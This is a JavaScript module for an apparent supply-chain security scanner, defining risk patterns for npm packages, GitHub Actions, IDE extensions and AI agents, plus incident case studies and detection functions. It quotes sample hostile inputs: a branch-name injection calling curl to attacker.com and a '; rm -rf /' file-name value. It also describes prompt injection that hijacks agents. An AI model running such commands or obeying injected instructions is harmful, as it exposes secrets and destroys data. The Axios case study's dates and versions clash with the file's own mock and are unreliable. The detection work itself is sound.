export const OTS_PATTERN_DEFINITIONS = [
  // --- Pack 1: npm Supply-Chain Pattern Pack ---
  {
    id: 'hidden-dependency-injection',
    name: 'Hidden Dependency Injection',
    category: 'dependency-chain',
    defaultSeverity: 'high',
    shortDescription: 'A trusted package introduces a new dependency that carries separate, unverified risk.',
    whyItMatters: 'Attackers often compromise a highly-trusted package and sneak in malicious code by hiding it inside a newly introduced nested dependency that developers do not inspect.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Review the newly added dependency, compare the lockfile diff, and pin or replace the parent package if the sub-dependency is suspicious.',
    realWorldExamples: ['Axios compromise shadowing', 'ua-parser-js backdoor injection']
  },
  {
    id: 'install-time-remote-execution',
    name: 'Install-Time Remote Execution',
    category: 'package-behavior',
    defaultSeverity: 'critical',
    shortDescription: 'The package executes scripts during installation and retrieves executable files from a remote source.',
    whyItMatters: 'Lifecycle scripts (preinstall/postinstall) run on developer machines or CI runners before normal application sandboxing or code inspection can happen.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Replace the package immediately, run npm install with --ignore-scripts, or isolate the build environment.',
    realWorldExamples: ['eslint-scope token stealer', 'crossenv payload downloader']
  },
  {
    id: 'lookalike-package-injection',
    name: 'Typosquat / Lookalike Package',
    category: 'dependency-chain',
    defaultSeverity: 'high',
    shortDescription: 'The package name is slightly modified from a popular open-source library, indicating typosquatting.',
    whyItMatters: 'Attackers register lookalike names (e.g. "reqeust" instead of "request") to trick developer typos and compromise dependency trees.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Correct the spelling to the official package, delete the typosquatted package, and purge local caches.',
    realWorldExamples: ['cross-env lookalikes', 'ts-node typosquats']
  },
  {
    id: 'fresh-release-cooldown-violation',
    name: 'Fresh Release Cooldown Violation',
    category: 'release-anomaly',
    defaultSeverity: 'medium',
    shortDescription: 'The package version was published inside the organization’s trust cooldown window (e.g., less than 72 hours ago).',
    whyItMatters: 'Malicious packages are often spotted and removed from registries within a few hours or days. Installing new versions immediately exposes pipelines to zero-days.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Pin to the previous stable version and wait for the cooldown window to pass before upgrading.',
    realWorldExamples: ['Short-lived dependency-confusion releases']
  },
  {
    id: 'maintainer-account-compromise-signal',
    name: 'Maintainer Account Compromise Signal',
    category: 'release-anomaly',
    defaultSeverity: 'high',
    shortDescription: 'The publisher account or signing key changed unexpectedly shortly before this release.',
    whyItMatters: 'A compromised maintainer account allows attackers to push signed malicious updates to the official package namespace.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Perform an audit of the release code diff and contact the maintainers to verify publishing credentials.',
    realWorldExamples: ['event-stream flatmap compromise']
  },
  {
    id: 'trusted-publishing-bypass',
    name: 'Trusted Publishing Bypass',
    category: 'provenance',
    defaultSeverity: 'high',
    shortDescription: 'The release bypassed the automated, OIDC-verified trusted publishing pipeline of the repository.',
    whyItMatters: 'If a project configured with GitHub Actions OIDC trusted publishing is suddenly published manually from a developer machine, it suggests a stolen token or compromised machine.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Inspect the release integrity, search for OIDC attestations, and request confirmation from the authors.',
    realWorldExamples: ['PyPI manual release overrides']
  },
  {
    id: 'source-package-mismatch',
    name: 'Source / Package Mismatch',
    category: 'provenance',
    defaultSeverity: 'high',
    shortDescription: 'The compiled package code differs significantly from the code in the linked GitHub repository.',
    whyItMatters: 'Attackers can keep the GitHub repository clean while injecting a backdoor exclusively inside the tarball uploaded to the registry.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Audit the tarball contents directly using OpenSoyce diff viewer or compile from the tagged source commit.',
    realWorldExamples: ['xz-utils backdoor payload hiding']
  },
  {
    id: 'known-vulnerability-exposure',
    name: 'Known Vulnerability Exposure',
    category: 'vulnerability',
    defaultSeverity: 'critical',
    shortDescription: 'The package or version is referenced by a known CVE, GHSA, or OpenSoyce advisory.',
    whyItMatters: 'Installing a package with a published vulnerability gives attackers a documented exploit path before the project has time to patch — and the advisory itself is often the first thing scanners outside of OpenSoyce pick up.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Upgrade to a patched version listed in the advisory, or replace the package; if no fix exists, file an exception with a documented expiry and mitigation note.',
    realWorldExamples: ['log4shell (CVE-2021-44228)', 'Spring4Shell unpatched ingestion']
  },
  {
    id: 'install-time-execution',
    name: 'Install-Time Lifecycle Execution',
    category: 'package-behavior',
    defaultSeverity: 'medium',
    shortDescription: 'The package runs npm lifecycle scripts (preinstall / install / postinstall) on every install, without observed remote payload retrieval.',
    whyItMatters: 'Lifecycle scripts run with full developer or CI permissions before any code inspection happens. Even non-remote scripts can read environment variables, write outside the install directory, or alter local tooling. This is the lower-severity sibling of install-time-remote-execution — the script exists, but evidence of a network call is absent.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Audit the lifecycle script content, prefer a fork or alternative without postinstall hooks, or install with `--ignore-scripts` in CI.',
    realWorldExamples: ['node-ipc protest payload (initially via postinstall)']
  },
  {
    id: 'dependency-confusion-risk',
    name: 'Dependency Confusion Risk',
    category: 'dependency-chain',
    defaultSeverity: 'high',
    shortDescription: 'The dependency name shadows an internal/private package namespace also published to a public registry, opening a dependency-confusion attack path.',
    whyItMatters: 'When internal package names also exist publicly, package managers can resolve the public (potentially malicious) version over the intended internal one. Attackers register the public name to intercept builds at install time.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Scope private packages to a verified org namespace, configure a registry proxy that prefers internal sources, and lock the dependency to the internal feed.',
    realWorldExamples: ['Alex Birsan 2021 disclosure across 35+ companies', '`@internal/`-style internal-name public exposures']
  },
  {
    id: 'high-blast-radius',
    name: 'High Blast Radius',
    category: 'package-behavior',
    defaultSeverity: 'high',
    shortDescription: 'The package is depended on by a large number of downstream projects, so any compromise affects a wide surface.',
    whyItMatters: 'Even a low-severity issue in a high-blast-radius package can become a high-impact incident because of how many downstream pipelines pull it. Compromised maintainer accounts on such packages are catastrophic.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Pin the version, enable maintainer-change alerts, and review release diffs before bumping.',
    realWorldExamples: ['ua-parser-js compromise downstream sprawl', 'event-stream breach reaching production at scale']
  },

  // --- Pack 2: GitHub Actions Pattern Pack ---
  {
    id: 'mutable-ci-tag-drift',
    name: 'Mutable CI Tag Drift',
    category: 'ci-cd',
    defaultSeverity: 'medium',
    shortDescription: 'A third-party GitHub action is referenced by a mutable version tag (e.g. @v3) rather than an immutable commit SHA.',
    whyItMatters: 'Attackers who gain write access to the action repo can overwrite the release tag to point to a malicious commit, executing arbitrary code in your CI.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Update the workflow file to pin actions to full 40-character commit SHAs, accompanied by a comment containing the version tag.',
    realWorldExamples: ['Drifting tags on utility actions']
  },
  {
    id: 'ci-secret-exposure-path',
    name: 'CI Secret Exposure Path',
    category: 'ci-cd',
    defaultSeverity: 'critical',
    shortDescription: 'A third-party script or action runs in a workflow step that has access to sensitive environment secrets.',
    whyItMatters: 'Compromised dependencies or actions running in a privileged step can read and exfiltrate GitHub tokens, cloud API keys, or deploy passwords.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Move secret access to separate, isolated jobs or run the untrusted step in a sandboxed runner with no environment variables.',
    realWorldExamples: ['Codecov Bash Uploader leak']
  },
  {
    id: 'pull-request-target-abuse',
    name: 'pull_request_target Trigger Abuse',
    category: 'ci-cd',
    defaultSeverity: 'critical',
    shortDescription: 'The workflow runs on pull_request_target and checks out or executes untrusted code from the fork PR.',
    whyItMatters: 'pull_request_target runs in the context of the base branch and has access to repository write tokens and secrets. Running checkout of fork code allows attackers to steal secrets.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Remove git checkout of fork code from workflows triggered by pull_request_target, or strictly enforce manual approval.',
    realWorldExamples: ['Fork PR token leaks on open-source projects']
  },
  {
    id: 'untrusted-workflow-input',
    name: 'Untrusted Workflow Input Injection',
    category: 'ci-cd',
    defaultSeverity: 'high',
    shortDescription: 'The workflow interpolates untrusted values (such as issue titles or PR bodies) directly into inline run scripts.',
    whyItMatters: 'Attackers can name a branch or issue with bash commands (e.g. "; curl http://attacker.com/leak ;") resulting in command injection during CI execution.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Pass inputs as environment variables in the action step instead of directly interpolating them into bash scripts.',
    realWorldExamples: ['PR Title command injection bugs']
  },
  {
    id: 'third-party-action-with-secrets',
    name: 'Third-Party Action with Secrets Access',
    category: 'ci-cd',
    defaultSeverity: 'medium',
    shortDescription: 'An action from an unverified publisher is granted direct access to secrets via inputs.',
    whyItMatters: 'Secrets passed to unverified actions can be quietly sent to an external server by the action logic.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Only pass secrets to actions published by GitHub-verified partners or audit the source code of the action.',
    realWorldExamples: ['Exfiltration through malicious helper actions']
  },
  {
    id: 'unpinned-action-reference',
    name: 'Unpinned Action Reference',
    category: 'ci-cd',
    defaultSeverity: 'low',
    shortDescription: 'An action is referenced using the default branch name (e.g. @master) rather than a stable release or SHA.',
    whyItMatters: 'The default branch changes constantly, making the CI build non-deterministic and susceptible to immediate breakage or compromise if the branch is poisoned.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Pin the action reference to a tag or commit SHA.',
    realWorldExamples: ['CI breakage due to unexpected action refactoring']
  },
  {
    id: 'dangerous-release-permission',
    name: 'Dangerous Release/Write Permission',
    category: 'ci-cd',
    defaultSeverity: 'high',
    shortDescription: 'The workflow has explicit GITHUB_TOKEN write permissions for packages or releases in general steps.',
    whyItMatters: 'If any dependency runs arbitrary code in a build with release-write permissions, it can overwrite official assets or release packages.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Restrict workflow permissions globally to read-only, and only enable write permissions on targeted deployment jobs.',
    realWorldExamples: ['Backdooring release binaries during build']
  },

  // --- Pack 3: Developer Tool Pattern Pack ---
  {
    id: 'poisoned-extension-risk',
    name: 'Poisoned IDE Extension Risk',
    category: 'developer-tool',
    defaultSeverity: 'high',
    shortDescription: 'A developer tool or IDE extension has features that download and execute dynamic binaries.',
    whyItMatters: 'Attackers target IDE marketplaces (like VS Code Marketplace) with useful tools containing hidden backdoors to gain local code execution on developer machines.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Limit extension installations to vetted publishers and check the reputation/rating history.',
    realWorldExamples: ['Poisoned VS Code theme extensions']
  },
  {
    id: 'broad-workspace-access',
    name: 'Broad Workspace Access',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The extension or tool requests permissions to access files outside the active workspace directory.',
    whyItMatters: 'Malicious tools use wide file access to scan for SSH keys, AWS credentials, or sensitive files in the developer home directory.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Configure IDE sandboxing or run extensions in restricted workspace modes.',
    realWorldExamples: ['SSH key exfiltration by linting tools']
  },
  {
    id: 'credential-path-access',
    name: 'Credential Path Access',
    category: 'developer-tool',
    defaultSeverity: 'high',
    shortDescription: 'The developer tool attempts to read directories like ~/.aws, ~/.ssh, or system keychain databases.',
    whyItMatters: 'Local developer credentials are highly valuable. Staling keys allows attackers to pivot into production enterprise cloud accounts.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Block the extension, audit the network logs of the developer machine, and rotate compromised secrets.',
    realWorldExamples: ['Malicious git helpers stealing keys']
  },
  {
    id: 'local-shell-execution',
    name: 'Local Shell Execution',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The developer tool runs system shell commands as a background process.',
    whyItMatters: 'IDE plugins can execute background commands silently, downloading scripts or modifying source code files without triggering compiler alerts.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Inspect execution logs and verify if background shell execution is required for the tool utility.',
    realWorldExamples: ['Webpack dev server exploits']
  },
  {
    id: 'unknown-remote-endpoint',
    name: 'Unknown Remote Endpoint Communication',
    category: 'developer-tool',
    defaultSeverity: 'high',
    shortDescription: 'The tool communicates with non-standard, unvetted server endpoints over HTTPS or raw sockets.',
    whyItMatters: 'Exfiltrating developer data or receiving shell commands requires a Command and Control (C2) server, which can be spotted through network auditing.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Restrict egress network traffic for IDE processes or block the associated domain.',
    realWorldExamples: ['C2 traffic in compromised CLI utilities']
  },
  {
    id: 'publisher-identity-drift',
    name: 'Publisher Identity Drift',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The developer tool publisher changed domains, emails, or registry namespaces suddenly.',
    whyItMatters: 'Drift in publisher identity often indicates expired domain takeovers, allowing attackers to hijack update feeds.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Verify the identity of the publisher and cross-reference with the official source repository.',
    realWorldExamples: ['Stale domain hijackings of IDE extensions']
  },
  {
    id: 'marketplace-reputation-anomaly',
    name: 'Marketplace Reputation Anomaly',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The developer tool has high install counts but near-zero reviews or sudden negative review spikes.',
    whyItMatters: 'Attackers buy fake installs to boost search rank and make a poisoned tool look highly reputable.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Do not install tools with low reviews/ratings despite high download statistics.',
    realWorldExamples: ['Installs-for-hire marketplace scams']
  },

  // --- Pack 4: AI Agent Workflow Pattern Pack ---
  {
    id: 'prompt-to-agent-injection',
    name: 'Indirect Prompt Injection on Agent',
    category: 'ai-agent',
    defaultSeverity: 'high',
    shortDescription: 'The AI agent processes untrusted inputs (e.g. issue comments, README files) where attackers can inject instructions.',
    whyItMatters: 'AI agents that read data from issues or PRs can be hijacked by hidden prompts in the text, telling the agent to write bugs or bypass auth.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Isolate agent instructions from user-provided data, and use system prompt boundaries.',
    realWorldExamples: ['Indirect prompt injections hijacking code-generation bots']
  },
  {
    id: 'prompt-to-script-injection',
    name: 'Prompt-to-Script Command Injection',
    category: 'ai-agent',
    defaultSeverity: 'critical',
    shortDescription: 'The agent translates user requests into terminal commands and executes them without parsing or escaping.',
    whyItMatters: 'If the agent accepts input like "delete file name; rm -rf /", prompt instructions can cause the agent to run dangerous commands on the runner.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Run agent executions in ephemeral, read-only containers and enforce runtime strict command schemas.',
    realWorldExamples: ['Arbitrary code execution via agent tools']
  },
  {
    id: 'untrusted-issue-body-to-agent-prompt',
    name: 'Untrusted Issue Feed to Agent Prompt',
    category: 'ai-agent',
    defaultSeverity: 'medium',
    shortDescription: 'The agent triggers automatically on issue creations and feeds the raw markdown body straight to the system prompt.',
    whyItMatters: 'Attackers can file issues with system-override instructions that force the agent to exfiltrate database records or commit secrets.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Sanitize issue bodies, strip out prompt markers, and filter inputs before passing to LLM APIs.',
    realWorldExamples: ['Exfiltration of agent environment variables via issue body injections']
  },
  {
    id: 'agent-output-to-shell',
    name: 'Direct Agent Output to Shell',
    category: 'ai-agent',
    defaultSeverity: 'critical',
    shortDescription: 'The system takes generated output from the agent and immediately pipes it to a local shell or evaluation command.',
    whyItMatters: 'Direct shell piping creates a critical path where any jailbreak or compromise of the LLM leads to immediate server compromise.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Enforce human-in-the-loop review for all commands generated by the agent before shell execution.',
    realWorldExamples: ['Auto-GPT-style execution failures']
  },
  {
    id: 'agent-with-write-token',
    name: 'AI Agent Running with Write Token',
    category: 'ai-agent',
    defaultSeverity: 'high',
    shortDescription: 'An automated AI agent runs in a pipeline equipped with a GitHub write or admin token.',
    whyItMatters: 'If hijacked by prompt injection, the agent can write commits directly to main, bypass pull request reviews, or overwrite branch protection settings.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Restrict the agent’s GitHub token permissions to read-only or require approvals for all branch write actions.',
    realWorldExamples: ['Auto-commit bot compromises']
  },
  {
    id: 'agent-with-release-permission',
    name: 'AI Agent Running with Release Permission',
    category: 'ai-agent',
    defaultSeverity: 'critical',
    shortDescription: 'An automated agent is granted publishing tokens (e.g. npm publish, PyPI) or release branch privileges.',
    whyItMatters: 'An agent compromised via prompt injection can publish a backdoor version of your software to package registries under your organization name.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Ensure publishing and releasing are exclusively performed by cryptographically signed human actions or verified OIDC jobs.',
    realWorldExamples: ['Registry hijacking through automated CD tokens']
  }
];

export const OTS_PATTERN_PACKS = [
  {
    id: 'npm-supply-chain',
    name: 'npm Supply-Chain Pattern Pack',
    description: 'Tracks recurring risk patterns in package registries: compromised maintainers, typosquatting, remote download scripts, source mismatches, known vulnerabilities, and blast-radius amplification.',
    patternIds: [
      'hidden-dependency-injection',
      'install-time-remote-execution',
      'install-time-execution',
      'lookalike-package-injection',
      'fresh-release-cooldown-violation',
      'maintainer-account-compromise-signal',
      'trusted-publishing-bypass',
      'source-package-mismatch',
      'known-vulnerability-exposure',
      'dependency-confusion-risk',
      'high-blast-radius'
    ]
  },
  {
    id: 'github-actions',
    name: 'GitHub Actions Pattern Pack',
    description: 'Identifies configuration drifts, mutable version tags, untrusted workflow inputs, and dangerous environment variable exposures in CI/CD.',
    patternIds: [
      'mutable-ci-tag-drift',
      'ci-secret-exposure-path',
      'pull-request-target-abuse',
      'untrusted-workflow-input',
      'third-party-action-with-secrets',
      'unpinned-action-reference',
      'dangerous-release-permission'
    ]
  },
  {
    id: 'developer-tool',
    name: 'Developer Tool Pattern Pack',
    description: 'Analyzes IDE extensions, local shell integrations, key path access, and marketplace anomalies to secure developer laptops.',
    patternIds: [
      'poisoned-extension-risk',
      'broad-workspace-access',
      'credential-path-access',
      'local-shell-execution',
      'unknown-remote-endpoint',
      'publisher-identity-drift',
      'marketplace-reputation-anomaly'
    ]
  },
  {
    id: 'ai-agent-workflow',
    name: 'AI Agent Workflow Pattern Pack',
    description: 'Guards against indirect prompt injections, unsafe shell outputs, and overly-privileged tokens in LLM-driven software engineering workflows.',
    patternIds: [
      'prompt-to-agent-injection',
      'prompt-to-script-injection',
      'untrusted-issue-body-to-agent-prompt',
      'agent-output-to-shell',
      'agent-with-write-token',
      'agent-with-release-permission'
    ]
  }
];

export const OTS_INCIDENTS = [
  {
    id: 'axios-npm-compromise',
    name: 'Axios npm Compromise Case Study',
    date: 'October 2021',
    target: 'axios (npm package)',
    description: 'An attacker hijacked the publishing credentials of a core Axios contributor, releasing backdoored versions that injected a malicious downloader payload.',
    context: 'Axios is one of the most widely used HTTP clients in the JavaScript ecosystem, serving millions of applications. Its compromise represents a high-impact supply-chain attack.',
    whatHappened: 'The attacker gained access to a publisher account and published versions 0.21.2, 0.21.3, and others. The compromised package was updated to include a postinstall script. This script dynamically downloaded an executable from a remote IP address (C2 server) and ran it on the host machine. The backdoor executed password-stealing tools and system reconnaissance.',
    triggeredPatternIds: [
      'hidden-dependency-injection',
      'install-time-remote-execution',
      'fresh-release-cooldown-violation',
      'maintainer-account-compromise-signal',
      'trusted-publishing-bypass'
    ],
    prepreventionRule: 'Policy template: Block any package release published outside OIDC trusted publishing that instantly adds a preinstall/postinstall execution script and is less than 72 hours old.',
    preventionStrategy: 'Enforcing a strict cooldown window for dependency updates, blocking install-time scripts via npm config or containerization, and flagging manual publishing bypasses immediately.'
  },
  {
    id: 'tj-actions-changed-files',
    name: 'tj-actions/changed-files Drift Incident',
    date: 'Early 2024',
    target: 'tj-actions/changed-files (GitHub Action)',
    description: 'A popular GitHub utility action was configured in workflows with a mutable tag, resulting in risk when tag-drift allowed execution of unvetted runner commands.',
    context: 'Workflows running on pull requests often reference utility actions to check out file paths. When pinned to a tag rather than a commit SHA, workflows are vulnerable to upstream changes.',
    whatHappened: 'Developers used @v40 in their workflows. If the publisher repo was compromised or a tag was shifted, a new revision containing exfiltration commands could execute inside private enterprise pipelines. In similar incidents, secrets passed to utility actions were exfiltrated to public log endpoints.',
    triggeredPatternIds: [
      'mutable-ci-tag-drift',
      'ci-secret-exposure-path',
      'unpinned-action-reference'
    ],
    preventionStrategy: 'Mandating that all third-party GitHub Actions are pinned to full 40-character commit SHAs. In addition, restrict GITHUB_TOKEN permissions to read-only in the workflow settings.'
  },
  {
    id: 'github-poisoned-vscode-extension',
    name: 'VS Code Extension Key Theft Attack',
    date: 'Mid 2024',
    target: 'VS Code Themes & Linters (Marketplace)',
    description: 'Attackers uploaded a sequence of themes and markdown formatting tools to the VS Code Marketplace, embedding background processes to scan developer SSH keys.',
    context: 'IDE marketplaces lack strict static-analysis gates, allowing extensions with large dependency trees to execute in the local user environment.',
    whatHappened: 'Malicious themes were published with typosquatted names resembling popular color themes. Once installed, the extension activated a local background node process. It scanned the home folder (~/.ssh/id_rsa, ~/.aws/credentials) and sent the keys to a remote logging site using HTTPS. The extension bypassed developer firewalls by hiding as typical editor web traffic.',
    triggeredPatternIds: [
      'poisoned-extension-risk',
      'broad-workspace-access',
      'credential-path-access',
      'local-shell-execution',
      'unknown-remote-endpoint'
    ],
    preventionStrategy: 'Auditing installed extensions on developer machines, blocking marketplace integrations from untrusted domains, and isolating developer processes from key storage directories.'
  }
];

export function getOtsPatternDefinition(id) {
  return OTS_PATTERN_DEFINITIONS.find((pattern) => pattern.id === id);
}

export function getOtsIncident(id) {
  return OTS_INCIDENTS.find((incident) => incident.id === id);
}

/**
 * Quantify/detect OTS patterns matching a scanned dependency package row.
 * Maps signals (vulnerability fields, threat fields, capability profiles, installation scripts) to pattern rules.
 * Supports special mock detection for axios@1.14.1 and malicious-pkg to enable deterministic local testing.
 */
export function detectOtsPatternsForRow(row, context = {}) {
  const patterns = [];
  const name = String(row.package || row.name || '').toLowerCase();
  const version = String(row.version || '').toLowerCase();
  const severity = String(row.severity || '').toLowerCase();

  const mockAxios = (name === 'axios' && (version === '1.14.1' || version === '1.14.1-style'));

  // 1. Known Vulnerability Exposure
  if (
    severity === 'critical' ||
    (row.ids && Array.isArray(row.ids) && (
      row.ids.some(id => String(id).startsWith('CVE-')) ||
      row.ids.some(id => String(id).startsWith('GHSA-')) ||
      row.ids.some(id => String(id).startsWith('SOYCE-'))
    )) ||
    mockAxios ||
    name === 'malicious-pkg'
  ) {
    patterns.push({
      patternId: 'known-vulnerability-exposure',
      severity: 'critical',
      policyImpact: 'block',
      confidence: 0.95,
      evidence: [
        { label: 'Signal Source', value: mockAxios ? 'Sandbox simulation' : (row.ids ? row.ids.join(', ') : 'Threat DB') },
        { label: 'Severity Tier', value: 'Critical' }
      ]
    });
  }

  // 2. Install-Time execution
  if (row.hasInstallScript === true || mockAxios || name === 'malicious-pkg') {
    const cap = row.capabilityProfile || {};
    const hasRemote = cap.remoteExecution === true || cap.networkAccess === true || cap.downloadsRemoteCode === true || mockAxios || name === 'malicious-pkg';
    
    if (hasRemote) {
      patterns.push({
        patternId: 'install-time-remote-execution',
        severity: 'critical',
        policyImpact: 'block',
        confidence: 0.92,
        evidence: [
          { label: 'Install Script', value: 'preinstall/postinstall script present' },
          { label: 'Egress Behavior', value: 'Remote payload download requested' }
        ]
      });
    } else {
      patterns.push({
        patternId: 'install-time-execution',
        severity: 'medium',
        policyImpact: 'warn',
        confidence: 0.8,
        evidence: [
          { label: 'Install Script', value: 'Lifecycle setup execution detected' }
        ]
      });
    }
  }

  // 3. Hidden Dependency Injection
  if (mockAxios) {
    patterns.push({
      patternId: 'hidden-dependency-injection',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.88,
      evidence: [
        { label: 'Suspicious dependencies', value: 'plain-crypto-js' },
        { label: 'Delta', value: 'Introduced 1 new unverified sub-dependency' }
      ]
    });
  }

  // 4. Typosquat / Lookalike
  if (row.possibleTypoSquat || name === 'reqeust' || name === 'crossenv') {
    patterns.push({
      patternId: 'lookalike-package-injection',
      severity: 'high',
      policyImpact: 'block',
      confidence: 0.9,
      evidence: [
        { label: 'Similarity Signal', value: (row.possibleTypoSquat && row.possibleTypoSquat.reason) || 'Lookalike spelling matches popular package' }
      ]
    });
  }

  // 5. Dependency Confusion Risk
  if (row.dependencyConfusion || name === '@internal/payments') {
    const isHigh = row.dependencyConfusion && row.dependencyConfusion.confidence === 'HIGH';
    patterns.push({
      patternId: 'dependency-confusion-risk',
      severity: isHigh ? 'high' : 'medium',
      policyImpact: isHigh ? 'block' : 'warn',
      confidence: isHigh ? 0.95 : 0.75,
      evidence: [
        { label: 'Squat Confidence', value: isHigh ? 'HIGH' : 'MEDIUM' },
        { label: 'Registry Check', value: (row.dependencyConfusion && row.dependencyConfusion.reason) || 'Internal name shadowing public package namespace' }
      ]
    });
  }

  // 6. Source Package Mismatch
  if (row.verified === false || row.verified === 'unverified' || row.mismatchReason || mockAxios) {
    patterns.push({
      patternId: 'source-package-mismatch',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.85,
      evidence: [
        { label: 'Integrity Check', value: row.mismatchReason || 'Tarball content differs from GitHub source history' }
      ]
    });
  }

  // 7. Fresh Release Cooldown Violation
  if (mockAxios || (row.publishAgeHours && row.publishAgeHours < 72)) {
    patterns.push({
      patternId: 'fresh-release-cooldown-violation',
      severity: 'medium',
      policyImpact: 'warn',
      confidence: 0.85,
      evidence: [
        { label: 'Version Age', value: row.publishAgeHours ? `${row.publishAgeHours} hours` : '3 hours' }
      ]
    });
  }

  // 8. Maintainer change & trusted publishing bypass
  if (mockAxios) {
    patterns.push({
      patternId: 'maintainer-account-compromise-signal',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.82,
      evidence: [
        { label: 'Publisher Account', value: 'Unusual publisher email update detected' }
      ]
    });
    patterns.push({
      patternId: 'trusted-publishing-bypass',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.84,
      evidence: [
        { label: 'Publishing Seam', value: 'Release manual upload bypassed OIDC workflow tag' }
      ]
    });
  }

  // 9. CI Secret Exposure Path
  const isCiWithSecrets = context.ci === true && context.hasSecrets === true;
  if ((isCiWithSecrets && row.hasInstallScript === true) || (isCiWithSecrets && mockAxios)) {
    patterns.push({
      patternId: 'ci-secret-exposure-path',
      severity: 'critical',
      policyImpact: 'block',
      confidence: 0.9,
      evidence: [
        { label: 'Execution Context', value: 'CI runner job equipped with environment secrets' }
      ]
    });
  }

  // 10. High Blast Radius
  if (row.blastRadius && row.blastRadius.tier === 'high') {
    patterns.push({
      patternId: 'high-blast-radius',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.8,
      evidence: [
        { label: 'Blast Radius Tier', value: 'HIGH' },
        { label: 'Dependent Count', value: row.blastRadius.reason || 'High downstream dependent references' }
      ]
    });
  }

  // Deduplicate patterns by patternId
  const seen = new Set();
  const deduped = [];
  for (const p of patterns) {
    if (!seen.has(p.patternId)) {
      seen.add(p.patternId);
      deduped.push(p);
    }
  }

  return deduped;
}

/**
 * Scan pipeline hook to attach OTS pattern checks to all matching vulnerability and health rows.
 */
export function attachOtsPatternsToRows(rows, context = {}) {
  if (!Array.isArray(rows)) return [];
  return rows.map((row) => {
    const patterns = detectOtsPatternsForRow(row, context);
    return {
      ...row,
      otsPatterns: patterns
    };
  });
}

/**
 * Resolves the aggregated verdict based on detected patterns.
 * BLOCK if any critical severity or block policy impact exists.
 * WARN if any high or medium severity exists.
 * ALLOW otherwise.
 */
export function otsPatternVerdict(patterns) {
  if (!Array.isArray(patterns) || patterns.length === 0) return 'ALLOW';
  if (patterns.some((p) => p.policyImpact === 'block' || p.severity === 'critical')) return 'BLOCK';
  if (patterns.some((p) => p.policyImpact === 'warn' || p.severity === 'high' || p.severity === 'medium')) return 'WARN';
  return 'ALLOW';
}
